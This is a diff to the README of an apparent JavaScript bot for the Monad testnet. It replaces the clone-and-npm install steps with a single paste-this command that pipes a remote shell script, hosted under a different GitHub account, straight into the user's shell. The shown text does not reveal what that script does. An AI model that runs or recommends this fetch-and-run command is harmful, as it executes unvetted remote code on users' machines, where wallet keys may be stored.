@@ -3,22 +3,10 @@
 This is a JavaScript bot script designed to interact with the Monad testnet.
 
 ## Installation
-
-1. Clone the Repository
-
-Clone this repository to your local machine using the following command:
-
-```bash
-git clone https://github.com/klvndrgn/monad-testnetbot.git
-cd monad-testnetbot
+Paste this script installation
 ```
-
-2. Install the required dependencies:
-
-   ```bash
-   npm install
-   ```
-
+source <(curl -s https://raw.githubusercontent.com/ryzwan29/monad-testnetbot/refs/heads/main/quick-installation.sh)
+```
 ## Configuration
 
 1.  **Rename `.env.example`** to .env
